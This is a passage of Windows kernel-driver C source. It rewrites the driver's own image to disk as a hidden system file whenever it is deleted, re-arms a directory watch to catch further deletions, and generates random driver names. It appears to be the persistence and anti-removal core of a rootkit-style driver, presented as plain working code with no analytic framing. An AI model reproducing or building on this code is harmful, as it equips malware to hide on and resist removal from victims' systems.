		ntstatus = ZwCreateFile(&hDrvFile, GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE, &objectAttributes, &ioStatusBlock, NULL, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN, 0, FILE_CREATE, FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE, NULL, 0);
		
		if (NT_SUCCESS(ntstatus)) {
			MYDBGPRINT("RewriteDrvFile: Created drv file. 0x%lX, 0x%llX", ntstatus, g_pRunTimeInfo->hMonitorDir);
			ntstatus = ZwWriteFile(hDrvFile, NULL, NULL, NULL, &ioStatusBlock, g_pRunTimeInfo->DrvImageBegin, g_pRunTimeInfo->DrvImageSize, NULL, NULL);
			if (!NT_SUCCESS(ntstatus)) {
				MYDBGPRINT("RewriteDrvFile: ZwWriteFile failed (0x%lX)", ntstatus);
			}
			else{
				MYDBGPRINT("RewriteDrvFile: Wrote drv file. 0x%lX", ntstatus);
				ntstatus = ZwFlushBuffersFile(hDrvFile, &ioStatusBlock);
				if (!NT_SUCCESS(ntstatus)){
					MYDBGPRINT("RewriteDrvFile: ZwFlushBuffersFile failed (0x%lX)", ntstatus);
				}
				else{
					MYDBGPRINT("RewriteDrvFile: Refreshed driver file! (0x%lX)", ntstatus);
				}
			}
			ZwClose(hDrvFile);
		}
		else{
			MYDBGPRINT("RewriteDrvFile: ZwCreateFile failed (0x%lX)", ntstatus);
		}


		RtlStringCbPrintfW(pszDrvFilePath, sizeof(pszDrvFilePath), L"%S", g_pCommonStrings->pFileInstallPath);
		RtlInitUnicodeString(&uDirectoryToMonitor, pszDrvFilePath);
		InitializeObjectAttributes(&objectAttributes, &uDirectoryToMonitor, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
		ntstatus = ZwOpenFile(&g_pRunTimeInfo->hMonitorDir, SYNCHRONIZE | FILE_READ_ATTRIBUTES, &objectAttributes, &g_pRunTimeInfo->drvFileIoStatusBlock, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_DIRECTORY_FILE | FILE_OPEN_FOR_BACKUP_INTENT | FILE_SYNCHRONOUS_IO_NONALERT);
		if (!NT_SUCCESS(ntstatus)){
			MYDBGPRINT("RewriteDrvFile: Failed to open drv directory for monitoring! 0x%lX", ntstatus);
			//return;
			continue;
		}
		MYDBGPRINT("RewriteDrvFile: opened drv directory for monitoring! 0x%lX", ntstatus);

		ntstatus = NtNotifyChangeDirectoryFile(g_pRunTimeInfo->hMonitorDir, NULL, NULL, NULL, &g_pRunTimeInfo->drvFileIoStatusBlock, &g_pRunTimeInfo->drvFileBuffer, sizeof(FILE_NOTIFY_INFORMATION), FILE_NOTIFY_CHANGE_NAME, FALSE);
		if (!NT_SUCCESS(ntstatus)){
			MYDBGPRINT("RewriteDrvFile: Failed to rearm drv directory notify routine! 0x%lX", ntstatus);
			ZwClose(g_pRunTimeInfo->hMonitorDir);
			//return;
		}else{
			MYDBGPRINT("RewriteDrvFile: Armed driver image deleted notification routine! 0x%lX", ntstatus);
		}
	}
}


void CreateRandName(PWCHAR pRandDrvName, ULONG length, BOOL flag){
	char toupperDelta = ('a' - 'A');
	ULONG seed = MAXLONG / 2;
	ULONG randCounter = 0;
	char randByte = 0;

	while (length - 1 > randCounter){
		randByte = (char)RtlRandomEx(&seed);
		if ((96 < randByte) && (123 > randByte)){
			pRandDrvName[randCounter] = randByte;
			randCounter++;
		}
	}
	if (flag){
		pRandDrvName[0] = (char)pRandDrvName[0] - toupperDelta;
	}
	pRandDrvName[length - 1] = 0x0;
}


BOOL mystrcmp(const WCHAR* prefix, WCHAR* testStr, ULONG lengthGiven, PARSEMETHOD parseMethod){
	lengthGiven >>= 1;
	if ((NULL == prefix) || (NULL == testStr)){
		return FALSE;
	}
	ULONG prefixLength = 0;
	SIZE_T j = 0;
	while (0 != prefix[prefixLength]){
		prefixLength++;
	}
	if (prefixLength <= lengthGiven){
		if (parseMethod == METHOD_END){
			j = lengthGiven - prefixLength;
		}

		SIZE_T i = 0;
		for (; j < lengthGiven - prefixLength + 1; j++){
			for (i = 0; i < prefixLength; i++){
				if ((testStr[i + j] > 64) && (testStr[i + j] < 91)){
					if (prefix[i] != testStr[i + j] + (WCHAR)32){
						break;
					}
				}
				else{
					if (prefix[i] != testStr[i + j]){
						break;
					}
				}
			}
			if (i >= (prefixLength)){
				return TRUE;
			}
		}
		return FALSE;
	}
	return FALSE;
}




